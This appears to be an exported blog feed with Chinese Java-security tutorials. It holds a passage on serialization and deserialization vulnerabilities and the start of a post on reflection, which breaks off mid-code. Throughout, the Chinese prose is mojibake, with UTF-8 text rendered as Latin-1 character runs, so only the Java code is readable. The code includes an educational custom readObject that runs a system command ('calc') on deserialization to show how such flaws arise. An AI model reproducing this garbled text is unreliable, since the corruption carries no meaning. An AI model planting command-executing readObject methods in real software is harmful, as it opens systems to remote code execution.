å½“æˆ‘ä»¬æ˜æ™°äº†ä¸ºä»€ä¹ˆéœ€è¦Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–åï¼Œæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šæƒ³Javaåºåˆ—åŒ–çš„å¥½å¤„ã€‚å…¶å¥½å¤„ä¸€æ˜¯å®ç°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼ˆé€šå¸¸å­˜æ”¾åœ¨æ–‡ä»¶é‡Œï¼‰ï¼ŒäºŒæ˜¯ï¼Œåˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚</p><p>â‘  æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ•°æ®åº“ä¸­æ—¶å€™ï¼›<br>â‘¡ æƒ³ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„æ—¶å€™ï¼›<br>â‘¢ æƒ³é€šè¿‡RMIä¼ è¾“å¯¹è±¡çš„æ—¶å€™</p><p>ä¸€äº›åº”ç”¨åœºæ™¯ï¼Œæ¶‰åŠåˆ°å°†å¯¹è±¡è½¬åŒ–æˆäºŒè¿›åˆ¶ï¼Œåºåˆ—åŒ–ä¿è¯äº†èƒ½å¤ŸæˆåŠŸè¯»å–åˆ°ä¿å­˜çš„å¯¹è±¡ã€‚</p><p>ç®€å•æ¥è®²ï¼ŒJavaçš„åºåˆ—åŒ–æœºåˆ¶å°±æ˜¯ä¸ºäº†æŒä¹…åŒ–å­˜å‚¨æŸä¸ªå¯¹è±¡æˆ–è€…åœ¨ç½‘ç»œä¸Šä¼ è¾“æŸä¸ªå¯¹è±¡ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œä¸€æ—¦jvmå…³é—­ï¼Œé‚£ä¹ˆjavaä¸­çš„å¯¹è±¡ä¹Ÿå°±é”€æ¯äº†ï¼Œæ‰€ä»¥è¦æƒ³ä¿å­˜å®ƒï¼Œå°±éœ€è¦æŠŠä»–è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—å†™åˆ°æŸä¸ªæ–‡ä»¶æˆ–æ˜¯å…¶å®ƒå“ªé‡Œã€‚</p><p>åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—<br>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—è½¬æ¢ä¸ºå¯¹è±¡</p><h3 id="0x03-ç¤ºä¾‹è®²è§£"><a href="#0x03-ç¤ºä¾‹è®²è§£" class="headerlink" title="0x03 ç¤ºä¾‹è®²è§£"></a>0x03 ç¤ºä¾‹è®²è§£</h3><p>ä¸€ä¸ªç±»å¯¹è±¡è¦æƒ³å®ç°åºåˆ—åŒ–ï¼Œå¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><p>1ã€è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable å¯¹è±¡ã€‚</p><p>2ã€è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚<del>å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚</del></p><p>è¦åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œé¦–å…ˆè¦åˆ›å»ºOutputStreamå¯¹è±¡ï¼Œå†å°†å…¶å°è£…åœ¨ä¸€ä¸ªObjectOutputStreamå¯¹è±¡å†…ï¼Œæ¥ç€åªéœ€è°ƒç”¨writeObject()å³å¯å°†å¯¹è±¡åºåˆ—åŒ–ï¼Œå¹¶å°†å…¶å‘é€ç»™OutputStreamï¼ˆå¯¹è±¡æ˜¯åŸºäºå­—èŠ‚çš„ï¼Œå› æ­¤è¦ä½¿ç”¨InputStreamå’ŒOutputStreamæ¥ç»§æ‰¿å±‚æ¬¡ç»“æ„ï¼‰ã€‚</p><p>è¦ååºåˆ—åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦å°†ä¸€ä¸ªInputStreamå°è£…åœ¨ObjectInputStreamå†…ï¼Œç„¶åè°ƒç”¨readObject()å³å¯ã€‚</p><p>çœ‹æ–‡å­—ä¸å¤Ÿç›´è§‚ï¼Œå’±ä»¬ç›´æ¥ä¸Šä»£ç ï¼ˆæ³¨æ„çœ‹æ³¨é‡Šï¼‰ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> user_ser<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"hsad"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// åˆ›å»ºä¸€ä¸ªFIleOutputStream</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// å°†è¿™ä¸ªFIleOutputStreamå°è£…åˆ°ObjectOutputStreamä¸­</span>            <span class="token class-name">ObjectOutputStream</span> os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// è°ƒç”¨writeObjectæ–¹æ³•ï¼Œåºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶user.serä¸­</span>            os<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯»å–æ•°æ®ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//  åˆ›å»ºä¸€ä¸ªFIleInutputStream</span>            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"./user.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// å°†FileInputStreamå°è£…åˆ°ObjectInputStreamä¸­</span>            <span class="token class-name">ObjectInputStream</span> oi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// è°ƒç”¨readObjectä»user.serä¸­ååºåˆ—åŒ–å‡ºå¯¹è±¡ï¼Œè¿˜éœ€è¦è¿›è¡Œä¸€ä¸‹ç±»å‹è½¬æ¢ï¼Œé»˜è®¤æ˜¯Objectç±»å‹</span>            <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span>oi<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            user1<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">,</span> <span class="token keyword">float</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">", Age: "</span><span class="token operator">+</span>age<span class="token operator">+</span><span class="token string">", Height: "</span><span class="token operator">+</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//     private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException&#123;</span><span class="token comment">//         System.out.println("[*]æ‰§è¡Œäº†è‡ªå®šä¹‰çš„readObjectå‡½æ•°");</span><span class="token comment">//         Runtime.getRuntime().exec("calc");</span><span class="token comment">//     &#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç¨‹åºæ‰§è¡Œè¿‡åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªuser.seræ–‡ä»¶ï¼Œå¹¶ä¸”ååºåˆ—åŒ–è¿‡åä¼šæ‰§è¡Œinfoæ–¹æ³•ï¼Œåœ¨ç»ˆç«¯ä¸Šæ‰“å°å‡ºUserçš„ä¿¡æ¯ï¼š</p><p><img src="1.png" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°æŒ‰ç…§é¢„æœŸæ‰§è¡Œäº†ï¼ŒæˆåŠŸç”Ÿæˆäº†ä¸€ä¸ªuser.seræ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é‡Œå­˜æ”¾çš„å°±æ˜¯ååºåˆ—åŒ–è¿‡åçš„Userç±»å¯¹è±¡ï¼Œæˆ‘ä»¬ç”¨010çœ‹ä¸€ä¸‹å†…å®¹ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„ç‰¹å¾å€¼å°±æ˜¯16è¿›åˆ¶æ˜¾ç¤ºæ—¶çš„å‰32ä½ï¼š</p><p><img src="2.png" loading="lazy"></p><p>AC EDï¼šSTREAM_MAGICï¼Œå£°æ˜ä½¿ç”¨äº†åºåˆ—åŒ–åè®®ï¼Œ<strong>ä»è¿™é‡Œå¯ä»¥åˆ¤æ–­ä¿å­˜çš„å†…å®¹æ˜¯å¦ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚</strong> ï¼ˆè¿™æ˜¯åœ¨é»‘ç›’æŒ–æ˜ååºåˆ—åŒ–æ¼æ´å¾ˆé‡è¦çš„ä¸€ä¸ªç‚¹ï¼‰</p><p>00 05ï¼šSTREAM_VERSIONï¼Œåºåˆ—åŒ–åè®®ç‰ˆæœ¬ã€‚</p><h3 id="0x04-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç‚¹"><a href="#0x04-ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç‚¹" class="headerlink" title="0x04 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç‚¹"></a>0x04 ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç‚¹</h3><p>ä¸Šé¢å·²ç»è¯´å®Œäº†åºåˆ—åŒ–çš„åŸºç¡€äº†ï¼Œå¤§å®¶ä¹Ÿåº”è¯¥çŸ¥é“å¦‚ä½•å®ç°ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–äº†ï¼Œé‚£ä¹ˆï¼Œæ¼æ´ç‚¹åˆ°åº•åœ¨å“ªé‡Œå‘¢?å¦‚æœä½ äº†è§£phpçš„ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆåº”è¯¥çŸ¥é“phpååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è§¦å‘<code>__weakup</code>ã€<code>__destruct</code>è¿™äº›å‡½æ•°ï¼Œå¦‚æœè¿™äº›å‡½æ•°å½“ä¸­æœ‰ä¸€äº›å±é™©çš„æ“ä½œï¼Œé‚£ä¹ˆå°±å¯èƒ½å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼ŒåŒæ ·çš„ï¼Œjavaååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘readObject()å‡½æ•°,ä½†æ˜¯ä¸Šé¢demoä¸­çš„readObject()å‡½æ•°ä¸æ˜¯ObjectInputStreamçš„æ–¹æ³•å—ï¼Œå¼€å‘è€…åˆä¸å¯ä»¥æ§åˆ¶ï¼Œæ€ä¹ˆä¼šå¯¼è‡´æ¼æ´å‘¢ï¼Ÿ</p><p>å…¶å®ï¼Œjavaæ˜¯æ”¯æŒè‡ªå®šä¹‰readObjectä¸writeObjectæ–¹æ³•çš„ï¼Œåªè¦æŸä¸ªç±»ä¸­æŒ‰ç…§ç‰¹å®šçš„è¦æ±‚å®ç°äº†readObjectæ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒï¼Œå¦‚æœè¿™ä¸ªè‡ªå®šä¹‰çš„readObjectæ–¹æ³•é‡Œè¿›è¡Œäº†ä¸€äº›å±é™©æ“ä½œï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´çš„å‘ç”Ÿäº†ã€‚è¯•éªŒä¸€ä¸‹ï¼šæˆ‘ä»¬è¿˜æ˜¯ç”¨ä¸Šé¢çš„ç±»ï¼Œä¸è¿‡è¿™æ¬¡è‡ªå®šä¹‰Userç±»çš„readObjectæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å»æ‰æœ€åä¸€ç‚¹ä»£ç çš„æ³¨é‡Šï¼Œå†æ¬¡æ‰§è¡Œï¼ŒæŸ¥çœ‹ç»“æœï¼š</p><p><img src="3.png" loading="lazy"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè‡ªå®šä¹‰çš„readObjectçš„ç¡®æ‰§è¡Œäº†ï¼</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åœ¨readObjectä¸­å†™ä¸Šå±é™©æ“ä½œï¼Œæ¯”å¦‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¼¹ä¸ªcalc:</p><p><img src="4.png" loading="lazy"></p><p>å…¶å®å¦‚æœç»†å¿ƒè§‚å¯Ÿä¼šå‘ç°ï¼Œå†è‡ªå®šä¹‰readobjectå‡½æ•°åï¼ŒåŸæœ¬çš„å¯¹è±¡ä¿¡æ¯å¹¶æ²¡æœ‰è¢«æ­£ç¡®æ‰“å°ï¼Œå› ä¸ºåœ¨Javaä¸­ï¼Œå½“ä½ è‡ªå®šä¹‰<code>readObject</code>æ–¹æ³•æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯åœ¨è¦†ç›–é»˜è®¤çš„ååºåˆ—åŒ–è¡Œä¸ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>ObjectInputStream</code>ä¼šä½¿ç”¨åå°„æ¥æ¢å¤å¯¹è±¡çš„çŠ¶æ€ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ æä¾›äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„<code>readObject</code>æ–¹æ³•ï¼Œé‚£ä¹ˆä½ éœ€è¦è‡ªå·±å¤„ç†å¯¹è±¡çŠ¶æ€çš„æ¢å¤ï¼ŒåŒ…æ‹¬å­—æ®µçš„èµ‹å€¼ã€‚</p><p>åœ¨<code>User</code>ç±»ä¸­ï¼Œè‡ªå®šä¹‰çš„<code>readObject</code>æ–¹æ³•å¹¶æ²¡æœ‰è°ƒç”¨é»˜è®¤çš„<code>readObject</code>æ¥æ¢å¤å¯¹è±¡çš„éç¬æ€å­—æ®µï¼ˆ<code>name</code>, <code>age</code>, <code>height</code>ï¼‰ï¼Œè€Œæ˜¯æ‰§è¡Œäº†ä¸€ä¸ªå¤–éƒ¨å‘½ä»¤<code>calc</code>ã€‚å› æ­¤ï¼Œå¯¹è±¡çš„å­—æ®µå¹¶æ²¡æœ‰è¢«æ­£ç¡®åœ°ä»æµä¸­è¯»å–å’Œèµ‹å€¼ï¼Œå¯¼è‡´äº†å­—æ®µå€¼ä¸ºé»˜è®¤å€¼ï¼Œå¯¹äºå¯¹è±¡å¼•ç”¨ç±»å‹ï¼ˆå¦‚<code>String</code>ï¼‰ï¼Œé»˜è®¤å€¼æ˜¯<code>null</code>ã€‚</p><h3 id="0x05-å°ç»“"><a href="#0x05-å°ç»“" class="headerlink" title="0x05 å°ç»“"></a>0x05 å°ç»“</h3><p>ä»¥ä¸Šåªæ˜¯å¯¹Javaååºåˆ—åŒ–çš„ä¸€ä¸ªå°Demoï¼Œäº‹å®ä¸Šæ‰åˆšåˆšå¼€å§‹ï¼Œä¹‹åå½“ç„¶æœ‰æ›´è¯¦ç»†çš„å­¦ä¹ </p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAå®‰å…¨åŸºç¡€-- åå°„æœºåˆ¶</title>
      <link href="/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/"/>
      <url>/2024/09/07/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-2/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-åå°„æ¦‚å¿µ"><a href="#0x01-åå°„æ¦‚å¿µ" class="headerlink" title="0x01 åå°„æ¦‚å¿µ"></a>0x01 åå°„æ¦‚å¿µ</h3><p>åå°„æ˜¯Javaçš„ç‰¹å¾ä¹‹ä¸€ï¼Œæ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯JVMåœ¨è¿è¡ŒçŠ¶æ€çš„æ—¶å€™æ‰åŠ¨æ€åŠ è½½ç±»ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„æ–¹æ³•&#x2F;è®¿é—®å±æ€§ã€‚è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚é€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚</p><h3 id="0x02-ç¼–è¯‘æœºåˆ¶"><a href="#0x02-ç¼–è¯‘æœºåˆ¶" class="headerlink" title="0x02 ç¼–è¯‘æœºåˆ¶"></a>0x02 ç¼–è¯‘æœºåˆ¶</h3><p>é™æ€ç¼–è¯‘ï¼šåœ¨ç¼–è¯‘æ—¶ç¡®å®šå¥½ç±»å‹ï¼Œç»‘å®šå¯¹è±¡ã€‚</p><p>åŠ¨æ€ç¼–è¯‘ï¼šåœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ï¼Œç»‘å®šå¯¹è±¡ã€‚</p><h3 id="0x03-ä¼˜ç‚¹"><a href="#0x03-ä¼˜ç‚¹" class="headerlink" title="0x03 ä¼˜ç‚¹"></a>0x03 ä¼˜ç‚¹</h3><p>åå°„ï¼šå°†ç±»çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…ä¸ºå…¶ä»–å¯¹è±¡ï¼Œè¿™å°±æ˜¯åå°„æœºåˆ¶ã€‚</p><p>1ã€å¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ“ä½œè¿™äº›å¯¹è±¡ã€‚</p><p>2ã€å¯ä»¥è§£è€¦ï¼Œæé«˜ç¨‹åºçš„å¯æ‰©å±•æ€§ã€‚</p><h3 id="0x04-ç¤ºä¾‹è®²è§£"><a href="#0x04-ç¤ºä¾‹è®²è§£" class="headerlink" title="0x04 ç¤ºä¾‹è®²è§£"></a>0x04 ç¤ºä¾‹è®²è§£</h3><p>åå°„æœºåˆ¶å¯ä»¥åŠ¨æ€åˆ›å»ºå¯¹è±¡å’Œç¼–è¯‘ï¼Œä½“ç°å¾ˆå¤§çš„çµæ´»æ€§ã€‚åœ¨ä¸€ä¸ªå¤§å‹ç³»ç»Ÿå‘å¸ƒæ—¶ï¼Œå¦‚æœä»¥åéœ€è¦æ›´æ–°æŸäº›åŠŸèƒ½çš„æ—¶å€™ï¼Œä¸å¯èƒ½è®©ç”¨æˆ·å°†ä¹‹å‰çš„æ¸¸æˆå¸è½½æ‰ï¼Œé‡æ–°å®‰è£…æ–°çš„ç‰ˆæœ¬ã€‚é‡‡å–é™æ€ç¼–è¯‘çš„è¯ï¼Œéœ€è¦æŠŠæ•´ä¸ªæ¸¸æˆé‡æ–°ç¼–è¯‘ä¸€æ¬¡æ‰èƒ½å®ç°åŠŸèƒ½çš„æ›´æ–°ï¼Œè€Œä½¿ç”¨åå°„æœºåˆ¶çš„è¯ï¼Œä¸éœ€è¦å¸è½½ï¼Œåªéœ€è¦åœ¨è¿è¡Œçš„æ—¶å€™åŠ¨æ€åˆ›å»ºå’Œç¼–è¯‘å³å¯ã€‚</p><h3 id="0x05-javaåå°„æœºåˆ¶æµç¨‹å›¾"><a href="#0x05-javaåå°„æœºåˆ¶æµç¨‹å›¾" class="headerlink" title="0x05 javaåå°„æœºåˆ¶æµç¨‹å›¾"></a>0x05 javaåå°„æœºåˆ¶æµç¨‹å›¾</h3><p><img src="1.png" loading="lazy"></p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç®€é™‹çš„æµç¨‹å›¾é…åˆè®²è¿°ä¸‹åå°„æœºåˆ¶åŸºæœ¬æµç¨‹ã€‚æ¯”å¦‚æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç±»æ–‡ä»¶ï¼Œç»è¿‡javacç¼–è¯‘ä¹‹åï¼Œå°±ä¼šå½¢æˆclassæ–‡ä»¶ï¼ŒåŒæ—¶jvmå†…å­˜ä¼šæŸ¥æ‰¾ç”Ÿæˆçš„classæ–‡ä»¶è¯»å…¥å†…å­˜å’Œç»è¿‡ClassLoaderåŠ è½½ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨åˆ›å»ºç”Ÿæˆä¸€ä¸ªClasså¯¹è±¡ï¼Œé‡Œé¢æ‹¥æœ‰å…¶è·å–æˆå‘˜å˜é‡Fieldï¼Œæˆå‘˜æ–¹æ³•Methodå’Œæ„é€ æ–¹æ³•Constructorç­‰æ–¹æ³•ã€‚æœ€åå°±æ˜¯æˆ‘ä»¬å¹³æ—¶newåˆ›å»ºå¯¹è±¡ã€‚</p><p>è¿™é‡Œå…¶å®è·Ÿæˆ‘ä»¬äº†è§£åˆ°javaè¿è¡Œä½“ç³»æ²¡æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œåªæ˜¯æˆ‘ä»¬ç”Ÿæˆclassæ–‡ä»¶çš„æ—¶å€™ï¼Œä¹Ÿåˆ›å»ºäº†Classå¯¹è±¡ã€‚è€ŒClassæ˜¯java.lang.Classç±»ä¸­ï¼Œæ˜¯æ‰€æœ‰ç±»çš„çš„ç±»ã€‚è€Œç±»æ˜¯java.lang.Classç±»çš„å®ä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„åå°„æœºåˆ¶æœ¬èº«ä¸å¤æ‚ï¼Œå°±æ˜¯è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡ï¼Œç„¶ååœ¨ç”¨Classå¯¹è±¡ä¸­çš„è·å–æˆå‘˜å˜é‡Fieldï¼Œæˆå‘˜æ–¹æ³•Methodå’Œæ„é€ æ–¹æ³•Constructorç­‰æ–¹æ³•ï¼Œå†å»åŠ¨æ€è·å–ä¸€ä¸ªç±»æˆ–è€…è°ƒç”¨ä¸€ä¸ªç±»çš„å±æ€§ï¼Œå˜é‡ï¼Œæ„é€ æ–¹æ³•ç­‰æ–¹å¼ã€‚</p><h3 id="0x06-åå°„ç»„æˆç›¸å…³çš„ç±»"><a href="#0x06-åå°„ç»„æˆç›¸å…³çš„ç±»" class="headerlink" title="0x06 åå°„ç»„æˆç›¸å…³çš„ç±»"></a>0x06 åå°„ç»„æˆç›¸å…³çš„ç±»</h3><p>åå°„æœºåˆ¶ç›¸å…³æ“ä½œä¸€èˆ¬ä½äºjava.lang.reflectåŒ…ä¸­ã€‚</p><p><img src="2.png" loading="lazy"></p><p>è€Œjavaåå°„æœºåˆ¶ç»„æˆéœ€è¦é‡ç‚¹æ³¨æ„ä»¥ä¸‹çš„ç±»ï¼š</p><p>java.lang.Classï¼šç±»å¯¹è±¡;</p><p>java.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡;</p><p>java.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡;</p><p>java.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡;</p><h3 id="0x07-åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³•"><a href="#0x07-åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³•" class="headerlink" title="0x07 åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³•"></a>0x07 åå°„å¸¸è§ä½¿ç”¨çš„æ–¹æ³•</h3><p>è·å–ç±»çš„æ–¹æ³•ï¼šforname</p><p>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance</p><p>è·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod</p><p>æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke</p><h3 id="classå¯¹è±¡çš„è·å–æ–¹æ³•"><a href="#classå¯¹è±¡çš„è·å–æ–¹æ³•" class="headerlink" title="classå¯¹è±¡çš„è·å–æ–¹æ³•"></a>classå¯¹è±¡çš„è·å–æ–¹æ³•</h3><p>ä»ä¸Šè¿°æµç¨‹å›¾åˆ†æä¸­å¯ä»¥å¾—çŸ¥ï¼Œjavaåå°„æœºåˆ¶çš„åŸç†åŸºç¡€æ˜¯ç†è§£Classç±»ï¼Œåœ¨åå°„ä¸­ï¼Œæˆ‘ä»¬æƒ³è·å–ä¸€ä¸ªç±»æˆ–è°ƒç”¨ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œéœ€è¦å…ˆè·å–åˆ°è¯¥ç±»çš„Classå¯¹è±¡ã€‚</p><p>å¯¹äºæ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 